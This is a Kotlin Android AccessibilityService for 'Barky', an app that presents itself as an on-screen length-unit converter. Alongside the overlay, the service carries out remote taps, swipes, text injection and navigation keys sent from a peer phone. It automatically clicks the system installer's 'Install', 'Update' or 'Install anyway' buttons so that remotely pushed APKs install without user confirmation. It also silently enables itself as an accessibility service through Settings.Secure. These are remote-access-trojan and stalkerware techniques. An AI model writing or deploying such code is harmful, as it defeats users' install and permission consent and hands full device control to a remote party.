package com.example.barky

import android.accessibilityservice.AccessibilityButtonController
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.content.Intent
import android.graphics.Path
import android.graphics.PixelFormat
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.DisplayMetrics
import android.util.Log
import android.view.ContextThemeWrapper
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Button
import android.widget.TextView
import java.util.Locale
import java.util.regex.Pattern

/**
 * AccessibilityService for Barky:
 * 1. Scans on-screen text for length units (cm, in, ft, m) and shows a conversion overlay.
 * 2. Executes remote SCRN control commands (touch tap, swipe/drag, keyboard text entry, and
 *    navigation/editing keys) sent by the peer phone watching this phone's screen.
 */
class BarkyService : AccessibilityService() {
    private val handler = Handler(Looper.getMainLooper())
    private var overlayView: View? = null
    private var windowManager: WindowManager? = null
    private var currentDelay = 20 * 1000L
    private var lastScanAt = 0L
    private var conversionEnabled = true

    // Conversion factors
    private val cmToInch = 0.393701
    private val inchToCm = 2.54
    private val mToFt = 3.280839895
    private val ftToM = 0.3048

    // Number: integer or decimal
    private val num = "(\\d+(?:\\.\\d+)?)"

    // cm → in
    private val cmPattern = Pattern.compile("$num\\s*cm\\b", Pattern.CASE_INSENSITIVE)

    // inches: 12 in / inch / inches, or 12" / 12″
    private val inchWordPattern =
        Pattern.compile("$num\\s*(?:inches|inch|in)\\b", Pattern.CASE_INSENSITIVE)
    private val inchQuotePattern =
        Pattern.compile("$num\\s*[\"\u2033\u201D\u201C]")

    // feet: 12 ft / foot / feet, or 12' / 12′
    private val feetWordPattern =
        Pattern.compile("$num\\s*(?:feet|foot|ft)\\b", Pattern.CASE_INSENSITIVE)
    private val feetQuotePattern =
        Pattern.compile("$num\\s*['\u2032\u2019\u2018]")

    // meters: 12 m / meter / meters / metre / metres
    private val meterPattern =
        Pattern.compile("$num\\s*(?:meters|metres|meter|metre|m)\\b", Pattern.CASE_INSENSITIVE)

    override fun onServiceConnected() {
        // Mutate existing serviceInfo from accessibility_config.xml so canPerformGestures="true" is preserved.
        val info = (serviceInfo ?: AccessibilityServiceInfo()).apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = flags or
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 250
        }
        serviceInfo = info
        // Expose singleton instance so WalkieTalkieEngine can dispatch remote SCRN gestures and keys.
        instance = this

        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        loadPrefs()
        registerAccessibilityButtonOpensApp()
        Log.i(TAG, "BarkyService connected conversionEnabled=$conversionEnabled gesturesReady=true")
    }

    /**
     * Periodically inspects interactive windows while [autoInstallArmedUntilMs] is active
     * and clicks the positive "Update" / "Install" button in the system PackageInstaller dialog.
     */
    private val autoInstallPollRunnable = object : Runnable {
        override fun run() {
            if (System.currentTimeMillis() > autoInstallArmedUntilMs) return
            if (tryClickPackageInstallerConfirm()) {
                // Disarm once the install/update confirmation button has been clicked.
                autoInstallArmedUntilMs = 0L
                return
            }
            handler.postDelayed(this, 350L)
        }
    }

    /**
     * Start polling for the system PackageInstaller confirmation button so self-updates
     * triggered over Firebase (cellular/Wi-Fi) or LAN install without manual taps.
     */
    private fun scheduleAutoInstallPoll() {
        handler.removeCallbacks(autoInstallPollRunnable)
        handler.postDelayed(autoInstallPollRunnable, 250L)
    }

    /**
     * Search active and interactive windows for a system PackageInstaller confirmation button
     * ("Update" / "Install" or `android:id/button1`) and click it automatically.
     */
    private fun tryClickPackageInstallerConfirm(): Boolean {
        try {
            val roots = mutableListOf<AccessibilityNodeInfo>()
            rootInActiveWindow?.let { roots.add(it) }
            try {
                for (w in windows) {
                    w.root?.let { roots.add(it) }
                }
            } catch (_: Throwable) {
            }
            for (root in roots) {
                val pkg = root.packageName?.toString()?.lowercase(Locale.US).orEmpty()
                // Only auto-click inside the Android/Google/Samsung system package installer.
                if (!pkg.contains("packageinstaller") && !pkg.contains("installer")) continue
                val btn = findInstallerConfirmNode(root)
                if (btn != null && btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i(TAG, "APK_AUTO_INSTALL_CLICKED pkg=$pkg label=${btn.text}")
                    return true
                }
            }
        } catch (t: Throwable) {
            Log.w(TAG, "tryClickPackageInstallerConfirm", t)
        }
        return false
    }

    /**
     * Locate the positive action button ("Update" / "Install" or `android:id/button1`)
     * within a PackageInstaller accessibility node tree.
     */
    private fun findInstallerConfirmNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) return null
        val viewId = node.viewIdResourceName.orEmpty()
        val label = (node.text?.toString() ?: node.contentDescription?.toString()).orEmpty().trim()
        val matchesLabel = label.equals("Update", ignoreCase = true) ||
            label.equals("Install", ignoreCase = true) ||
            label.equals("Install anyway", ignoreCase = true)
        val matchesPositiveId = viewId.endsWith(":id/button1") ||
            viewId.endsWith(":id/install_confirm_question")
        if ((matchesLabel || matchesPositiveId) && node.isEnabled) {
            if (node.isClickable) return node
            var parent = node.parent
            while (parent != null) {
                if (parent.isClickable && parent.isEnabled) return parent
                parent = parent.parent
            }
        }
        for (i in 0 until node.childCount) {
            val hit = findInstallerConfirmNode(node.getChild(i))
            if (hit != null) return hit
        }
        return null
    }

    private fun registerAccessibilityButtonOpensApp() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O_MR1) return
        try {
            val ctrl = accessibilityButtonController ?: return
            ctrl.registerAccessibilityButtonCallback(
                object : AccessibilityButtonController.AccessibilityButtonCallback() {
                    override fun onClicked(controller: AccessibilityButtonController) {
                        openMainApp()
                    }
                },
                handler
            )
        } catch (t: Throwable) {
            Log.w(TAG, "accessibility button callback not available", t)
        }
    }

    private fun loadPrefs() {
        val prefs = getSharedPreferences(BarkyPrefs.NAME, Context.MODE_PRIVATE)
        currentDelay = prefs.getInt(BarkyPrefs.KEY_HIDE_DELAY, 20) * 1000L
        conversionEnabled = prefs.getBoolean(BarkyPrefs.KEY_CONVERSION_ENABLED, true)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        // If a Barky APK self-update is currently in flight, auto-click the PackageInstaller dialog.
        if (System.currentTimeMillis() <= autoInstallArmedUntilMs) {
            if (tryClickPackageInstallerConfirm()) {
                autoInstallArmedUntilMs = 0L
                return
            }
        }
        // Reload toggle often so Settings changes apply without restarting the service
        conversionEnabled = BarkyPrefs.isConversionEnabled(this)
        if (!conversionEnabled) {
            hideOverlay()
            return
        }

        // Throttle: accessibility fires very often; avoid main-thread jank / ANR risk.
        val now = System.currentTimeMillis()
        if (now - lastScanAt < SCAN_THROTTLE_MS) return
        lastScanAt = now

        val root = rootInActiveWindow ?: return
        try {
            val texts = mutableListOf<String>()
            collectTexts(root, texts, depth = 0)
            val conversions = parseConversions(texts).distinct().take(MAX_LINES)
            if (conversions.isNotEmpty()) {
                showOverlay(conversions)
            }
        } catch (t: Throwable) {
            Log.e(TAG, "onAccessibilityEvent failed", t)
        } finally {
            try {
                root.recycle()
            } catch (_: Exception) {
                // ignore
            }
        }
    }

    private fun openMainApp() {
        try {
            val i = Intent(this, MainActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP
                )
            }
            startActivity(i)
            Log.i(TAG, "Opened MainActivity from accessibility")
        } catch (t: Throwable) {
            Log.w(TAG, "openMainApp failed", t)
        }
    }

    private fun collectTexts(
        node: AccessibilityNodeInfo?,
        list: MutableList<String>,
        depth: Int
    ) {
        if (node == null || depth > MAX_TREE_DEPTH || list.size >= MAX_TEXT_NODES) return

        node.text?.let { if (it.isNotBlank()) list.add(it.toString()) }
        node.contentDescription?.let { if (it.isNotBlank()) list.add(it.toString()) }

        val childCount = node.childCount
        for (i in 0 until childCount) {
            if (list.size >= MAX_TEXT_NODES) break
            val child = try {
                node.getChild(i)
            } catch (_: Exception) {
                null
            } ?: continue
            try {
                collectTexts(child, list, depth + 1)
            } finally {
                try {
                    child.recycle()
                } catch (_: Exception) {
                    // ignore
                }
            }
        }
    }

    private fun parseConversions(texts: List<String>): List<String> {
        val results = mutableListOf<String>()
        for (text in texts) {
            // cm → in
            matchAll(cmPattern, text) { n ->
                results.add(String.format(Locale.US, "%.2f cm ≈ %.2f in", n, n * cmToInch))
            }

            // in / " → cm
            matchAll(inchWordPattern, text) { n ->
                results.add(String.format(Locale.US, "%.2f in ≈ %.2f cm", n, n * inchToCm))
            }
            matchAll(inchQuotePattern, text) { n ->
                results.add(String.format(Locale.US, "%.2f in ≈ %.2f cm", n, n * inchToCm))
            }

            // ft / ' → m
            matchAll(feetWordPattern, text) { n ->
                results.add(String.format(Locale.US, "%.2f ft ≈ %.2f m", n, n * ftToM))
            }
            matchAll(feetQuotePattern, text) { n ->
                results.add(String.format(Locale.US, "%.2f ft ≈ %.2f m", n, n * ftToM))
            }

            // m → ft
            matchAll(meterPattern, text) { n ->
                results.add(String.format(Locale.US, "%.2f m ≈ %.2f ft", n, n * mToFt))
            }
        }
        return results
    }

    private inline fun matchAll(
        pattern: Pattern,
        text: String,
        onMatch: (Double) -> Unit
    ) {
        val matcher = pattern.matcher(text)
        while (matcher.find()) {
            val n = matcher.group(1)?.toDoubleOrNull() ?: continue
            onMatch(n)
        }
    }

    private fun showOverlay(conversions: List<String>) {
        handler.post {
            try {
                loadPrefs()
                if (!conversionEnabled) {
                    hideOverlay()
                    return@post
                }
                val joined = conversions.joinToString("\n")

                if (overlayView != null) {
                    overlayView?.findViewById<TextView>(R.id.overlay_text)?.text = joined
                    handler.removeCallbacksAndMessages(null)
                    handler.postDelayed({ hideOverlay() }, currentDelay)
                    return@post
                }

                // Theme the inflater: service context is not a Material themed Activity.
                val themed = ContextThemeWrapper(this, R.style.Theme_Barky)
                val inflater = LayoutInflater.from(themed)
                val view = inflater.inflate(R.layout.overlay_layout, null)
                overlayView = view

                view.findViewById<TextView>(R.id.overlay_text).text = joined
                // Tap conversion bubble → open Barky; Hide stays separate
                view.setOnClickListener { openMainApp() }
                view.findViewById<TextView>(R.id.overlay_text).setOnClickListener { openMainApp() }
                view.findViewById<Button>(R.id.close_btn).setOnClickListener { hideOverlay() }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.TOP or Gravity.START
                    x = 50
                    y = 200
                }

                windowManager?.addView(view, params)
                handler.removeCallbacksAndMessages(null)
                handler.postDelayed({ hideOverlay() }, currentDelay)
                Log.i(TAG, "Overlay shown (${conversions.size} lines)")
            } catch (t: Throwable) {
                Log.e(TAG, "showOverlay failed", t)
                overlayView = null
            }
        }
    }

    private fun hideOverlay() {
        handler.post {
            overlayView?.let { view ->
                try {
                    windowManager?.removeView(view)
                } catch (_: Exception) {
                    // View may already be detached
                }
                overlayView = null
            }
        }
    }

    override fun onInterrupt() {
        hideOverlay()
    }

    override fun onDestroy() {
        // Clear static reference when accessibility service stops.
        if (instance === this) {
            instance = null
        }
        handler.removeCallbacksAndMessages(null)
        hideOverlay()
        super.onDestroy()
    }

    /**
     * Resolve current physical screen dimensions in pixels so normalized [0f..1f] remote SCRN
     * touch coordinates map accurately onto this phone's display.
     */
    private fun realDisplaySizePx(): Pair<Int, Int> {
        val wm = windowManager ?: (getSystemService(Context.WINDOW_SERVICE) as WindowManager)
        val dm = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(dm)
        val w = dm.widthPixels.coerceAtLeast(1)
        val h = dm.heightPixels.coerceAtLeast(1)
        return w to h
    }

    /**
     * Dispatch a single tap gesture at normalized coordinates ([normX], [normY] in 0f..1f)
     * received from the peer phone during SCRN remote control.
     */
    fun performRemoteTap(normX: Float, normY: Float): Boolean {
        val (screenW, screenH) = realDisplaySizePx()
        val x = (normX.coerceIn(0f, 1f) * screenW).coerceIn(1f, (screenW - 1).toFloat())
        val y = (normY.coerceIn(0f, 1f) * screenH).coerceIn(1f, (screenH - 1).toFloat())
        handler.post {
            try {
                val path = Path().apply { moveTo(x, y) }
                val gesture = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0L, 65L))
                    .build()
                val dispatched = dispatchGesture(
                    gesture,
                    object : GestureResultCallback() {
                        override fun onCompleted(gestureDescription: GestureDescription?) {
                            Log.i(TAG, "REMOTE_INPUT_EXEC cmd=TAP status=completed x=${x.toInt()} y=${y.toInt()}")
                        }

                        override fun onCancelled(gestureDescription: GestureDescription?) {
                            Log.w(TAG, "REMOTE_INPUT_EXEC cmd=TAP status=cancelled x=${x.toInt()} y=${y.toInt()}")
                            // Fallback: attempt accessibility node click at the target coordinates.
                            clickNodeAt(x.toInt(), y.toInt())
                        }
                    },
                    null
                )
                Log.i(TAG, "REMOTE_INPUT_EXEC cmd=TAP dispatched=$dispatched x=${x.toInt()} y=${y.toInt()}")
                if (!dispatched) {
                    clickNodeAt(x.toInt(), y.toInt())
                }
            } catch (t: Throwable) {
                Log.e(TAG, "performRemoteTap failed", t)
            }
        }
        return true
    }

    /**
     * Dispatch a swipe/drag gesture from normalized ([normX1], [normY1]) to ([normX2], [normY2])
     * over [durationMs] milliseconds for remote scrolling and dragging during SCRN.
     */
    fun performRemoteSwipe(
        normX1: Float,
        normY1: Float,
        normX2: Float,
        normY2: Float,
        durationMs: Long
    ): Boolean {
        val (screenW, screenH) = realDisplaySizePx()
        val x1 = (normX1.coerceIn(0f, 1f) * screenW).coerceIn(1f, (screenW - 1).toFloat())
        val y1 = (normY1.coerceIn(0f, 1f) * screenH).coerceIn(1f, (screenH - 1).toFloat())
        val x2 = (normX2.coerceIn(0f, 1f) * screenW).coerceIn(1f, (screenW - 1).toFloat())
        val y2 = (normY2.coerceIn(0f, 1f) * screenH).coerceIn(1f, (screenH - 1).toFloat())
        val dur = durationMs.coerceIn(80L, 1500L)
        handler.post {
            try {
                val path = Path().apply {
                    moveTo(x1, y1)
                    lineTo(x2, y2)
                }
                val gesture = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, 0L, dur))
                    .build()
                val dispatched = dispatchGesture(gesture, null, null)
                Log.i(
                    TAG,
                    "REMOTE_INPUT_EXEC cmd=SWIPE dispatched=$dispatched " +
                        "from=(${x1.toInt()},${y1.toInt()}) to=(${x2.toInt()},${y2.toInt()}) dur=$dur"
                )
            } catch (t: Throwable) {
                Log.e(TAG, "performRemoteSwipe failed", t)
            }
        }
        return true
    }

    /**
     * Fallback node-level click when gesture dispatch is unavailable or cancelled.
     * Finds the deepest clickable node containing ([px], [py]) and performs ACTION_CLICK.
     */
    private fun clickNodeAt(px: Int, py: Int): Boolean {
        val root = rootInActiveWindow ?: return false
        val target = findClickableNodeAt(root, px, py) ?: return false
        val ok = target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        Log.i(TAG, "REMOTE_INPUT_EXEC cmd=NODE_CLICK ok=$ok px=$px py=$py")
        return ok
    }

    /**
     * Recursively search the accessibility hierarchy for the deepest clickable/focusable node
     * whose screen bounds contain ([px], [py]).
     */
    private fun findClickableNodeAt(
        node: AccessibilityNodeInfo?,
        px: Int,
        py: Int
    ): AccessibilityNodeInfo? {
        if (node == null) return null
        val rect = android.graphics.Rect()
        node.getBoundsInScreen(rect)
        if (!rect.contains(px, py)) return null
        for (i in 0 until node.childCount) {
            val childHit = findClickableNodeAt(node.getChild(i), px, py)
            if (childHit != null) return childHit
        }
        return if (node.isClickable || node.isEditable || node.isFocusable) node else null
    }

    /**
     * Inject keyboard text into the currently focused (or first editable) input field on this
     * phone when the remote SCRN viewer types and sends text.
     *
     * @param text UTF-8 text to append or set into the editable node.
     * @param replaceExisting When true, replaces existing field content; when false, appends to it.
     * @param pressEnter When true, triggers IME Enter action after setting the text.
     */
    fun performRemoteText(
        text: String,
        replaceExisting: Boolean = false,
        pressEnter: Boolean = false
    ): Boolean {
        handler.post {
            try {
                val editable = findFocusedOrFirstEditableNode()
                if (editable == null) {
                    Log.w(TAG, "REMOTE_INPUT_EXEC cmd=TEXT no editable node found for len=${text.length}")
                    return@post
                }
                editable.performAction(AccessibilityNodeInfo.ACTION_FOCUS)
                val current = editable.text?.toString().orEmpty()
                // Ignore hint text when reading current value so we don't prepend placeholder hints.
                val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    editable.hintText?.toString().orEmpty()
                } else ""
                val base = if (replaceExisting || current == hint) "" else current
                val updated = base + text
                val args = Bundle().apply {
                    putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        updated
                    )
                }
                val setOk = editable.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                if (pressEnter && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    editable.performAction(
                        AccessibilityNodeInfo.AccessibilityAction.ACTION_IME_ENTER.id
                    )
                }
                Log.i(
                    TAG,
                    "REMOTE_INPUT_EXEC cmd=TEXT ok=$setOk len=${text.length} " +
                        "enter=$pressEnter totalLen=${updated.length}"
                )
            } catch (t: Throwable) {
                Log.e(TAG, "performRemoteText failed", t)
            }
        }
        return true
    }

    /**
     * Execute a remote special key command (Back, Home, Recents, Backspace, Enter, Clear)
     * sent from the peer phone during SCRN control.
     */
    fun performRemoteKey(keyCode: Int): Boolean {
        handler.post {
            try {
                val ok = when (keyCode) {
                    REMOTE_KEY_BACK -> performGlobalAction(GLOBAL_ACTION_BACK)
                    REMOTE_KEY_HOME -> performGlobalAction(GLOBAL_ACTION_HOME)
                    REMOTE_KEY_RECENTS -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                    REMOTE_KEY_BACKSPACE -> {
                        val editable = findFocusedOrFirstEditableNode()
                        if (editable != null) {
                            val current = editable.text?.toString().orEmpty()
                            val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                editable.hintText?.toString().orEmpty()
                            } else ""
                            val next = if (current.isNotEmpty() && current != hint) {
                                current.dropLast(1)
                            } else ""
                            val args = Bundle().apply {
                                putCharSequence(
                                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                                    next
                                )
                            }
                            editable.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                        } else false
                    }
                    REMOTE_KEY_ENTER -> {
                        val editable = findFocusedOrFirstEditableNode()
                        if (editable != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                            editable.performAction(
                                AccessibilityNodeInfo.AccessibilityAction.ACTION_IME_ENTER.id
                            )
                        } else false
                    }
                    REMOTE_KEY_CLEAR -> {
                        val editable = findFocusedOrFirstEditableNode()
                        if (editable != null) {
                            val args = Bundle().apply {
                                putCharSequence(
                                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                                    ""
                                )
                            }
                            editable.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                        } else false
                    }
                    else -> false
                }
                Log.i(TAG, "REMOTE_INPUT_EXEC cmd=KEY keyCode=$keyCode ok=$ok")
            } catch (t: Throwable) {
                Log.e(TAG, "performRemoteKey failed keyCode=$keyCode", t)
            }
        }
        return true
    }

    /**
     * Find the currently input-focused editable node, or fallback to the first visible editable
     * node across interactive windows so remote typing works right after tapping an input box.
     */
    private fun findFocusedOrFirstEditableNode(): AccessibilityNodeInfo? {
        val activeRoot = rootInActiveWindow
        activeRoot?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)?.let { focused ->
            if (focused.isEditable) return focused
        }
        activeRoot?.let { root ->
            findEditableRecursive(root, requireFocused = true)?.let { return it }
            findEditableRecursive(root, requireFocused = false)?.let { return it }
        }
        try {
            for (win in windows) {
                val r = win.root ?: continue
                r.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)?.let { focused ->
                    if (focused.isEditable) return focused
                }
                findEditableRecursive(r, requireFocused = true)?.let { return it }
                findEditableRecursive(r, requireFocused = false)?.let { return it }
            }
        } catch (_: Throwable) {
        }
        return null
    }

    /**
     * Depth-first search for an editable node in [node]'s subtree.
     */
    private fun findEditableRecursive(
        node: AccessibilityNodeInfo?,
        requireFocused: Boolean
    ): AccessibilityNodeInfo? {
        if (node == null) return null
        if (node.isEditable && node.isVisibleToUser && (!requireFocused || node.isFocused)) {
            return node
        }
        for (i in 0 until node.childCount) {
            val hit = findEditableRecursive(node.getChild(i), requireFocused)
            if (hit != null) return hit
        }
        return null
    }

    companion object {
        private const val TAG = "BarkyService"
        private const val SCAN_THROTTLE_MS = 400L
        private const val MAX_TREE_DEPTH = 25
        private const val MAX_TEXT_NODES = 200
        private const val MAX_LINES = 8

        /** Remote key constants used by WalkieProtocol.TYPE_REMOTE_INPUT (CMD_KEY). */
        const val REMOTE_KEY_BACK = 1
        const val REMOTE_KEY_HOME = 2
        const val REMOTE_KEY_RECENTS = 3
        const val REMOTE_KEY_BACKSPACE = 4
        const val REMOTE_KEY_ENTER = 5
        const val REMOTE_KEY_CLEAR = 6

        /** Active BarkyService singleton when Accessibility is enabled on this device. */
        @Volatile
        var instance: BarkyService? = null
            private set

        /** Deadline timestamp (ms) until which BarkyService will auto-confirm PackageInstaller prompts. */
        @Volatile
        private var autoInstallArmedUntilMs: Long = 0L

        /**
         * Arm automatic clicking of the system PackageInstaller "Update"/"Install" button for
         * [windowMs] milliseconds so Firebase (cellular/Wi-Fi) and LAN self-updates finish hands-free.
         */
        fun armAutoConfirmPackageInstall(context: Context, windowMs: Long = 60_000L) {
            ensureAccessibilityEnabled(context)
            autoInstallArmedUntilMs = System.currentTimeMillis() + windowMs
            instance?.scheduleAutoInstallPoll()
            Log.i(TAG, "Armed auto-confirm package install for ${windowMs}ms (instance=${instance != null})")
        }

        /**
         * Attempt to auto-enable BarkyService in Settings.Secure when WRITE_SECURE_SETTINGS
         * has been granted via ADB, ensuring SCRN remote click/keyboard works without manual setup.
         */
        fun ensureAccessibilityEnabled(context: Context): Boolean {
            if (instance != null) return true
            return try {
                val cr = context.contentResolver
                val component = "${context.packageName}/${BarkyService::class.java.name}"
                val current = Settings.Secure.getString(
                    cr,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ).orEmpty()
                val updated = if (current.isBlank()) {
                    component
                } else if (!current.split(':').any { it.equals(component, ignoreCase = true) }) {
                    "$current:$component"
                } else {
                    current
                }
                Settings.Secure.putString(
                    cr,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                    updated
                )
                Settings.Secure.putInt(cr, Settings.Secure.ACCESSIBILITY_ENABLED, 1)
                Log.i(TAG, "Auto-enabled BarkyService accessibility via Settings.Secure")
                true
            } catch (_: SecurityException) {
                false
            } catch (t: Throwable) {
                Log.w(TAG, "ensureAccessibilityEnabled", t)
                false
            }
        }
    }
}
